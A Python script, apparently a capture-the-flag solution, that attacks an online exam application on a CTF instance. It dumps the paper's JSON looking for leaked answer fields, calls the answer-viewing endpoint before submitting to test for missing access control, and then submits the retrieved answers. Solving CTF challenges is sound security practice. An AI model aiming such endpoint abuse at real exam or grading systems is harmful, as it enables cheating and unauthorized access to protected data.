import requests
import json
import logging
import sys
import time

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

BASE = "http://bg73339m7b3kfjbb.instance.penguin.0ops.sjtu.cn:18080/"

s = requests.Session()
s.headers.update({"X-Requested-With": "XMLHttpRequest"})

# ========== Step 1: 获取试卷，并打印完整响应 ==========
logger.info("Step 1: Fetching exam paper...")
try:
    t_start = time.time()
    paper_resp = s.get(BASE + "?action=get_paper", timeout=2)
    paper = paper_resp.json()
    pid1 = paper["paper_id1"]
    pid2 = paper["paper_id2"]
    logger.info(f"paper_id1={pid1}, paper_id2={pid2}")

    # 完整输出试卷数据，人工检查是否有答案字段
    logger.info("=== FULL PAPER RESPONSE ===")
    print(json.dumps(paper, indent=2, ensure_ascii=False))
    logger.info("=== END PAPER RESPONSE ===")

    # 尝试自动搜索可能隐藏的答案
    if "questions" in paper:
        for i, q in enumerate(paper["questions"]):
            if "answer" in q or "correct" in q or "answer_num" in q:
                logger.info(
                    f"Q{i}: Possible answer field found: { {k:v for k,v in q.items() if k in ['answer','correct','answer_num']} }"
                )
except Exception as e:
    logger.error(f"Failed to get paper: {e}")
    sys.exit(1)

# ========== Step 2: 尝试直接获取答案（不提交） ==========
logger.info("Step 2: Trying to fetch answers WITHOUT blind submit...")
try:
    ans_resp = s.get(
        BASE + f"?action=view_answer&paper_id1={pid1}&paper_id2={pid2}", timeout=2
    )
    logger.info(f"view_answer (no submit) status: {ans_resp.status_code}")
    if ans_resp.status_code == 200:
        ans_data = ans_resp.json()
        if ans_data.get("success"):
            logger.info("SUCCESS! Got answers without submitting first.")
            correct_answers = []
            for q in ans_data["questions"]:
                if "answer_num" in q:
                    correct_answers.append(q["answer_num"])
                else:
                    correct_answers.append(q["answer"])
            logger.info(f"Correct answers: {correct_answers}")

            # 直接提交正确答案
            logger.info("Submitting correct answers...")
            payload = {
                "paper_id1": pid1,
                "paper_id2": pid2,
                "answers": json.dumps(correct_answers),
            }
            final_resp = s.post(BASE + "?action=submit_answer", data=payload, timeout=2)
            logger.info(f"Submit status: {final_resp.status_code}")
            logger.info(f"Response: {final_resp.text}")
            sys.exit(0)
        else:
            logger.warning(
                f"view_answer returned success=false: {ans_data.get('message')}"
            )
    else:
        logger.warning("view_answer without submit failed")
except Exception as e:
    logger.error(f"Direct view_answer error: {e}")

logger.info("Direct answer fetch failed, need further analysis.")
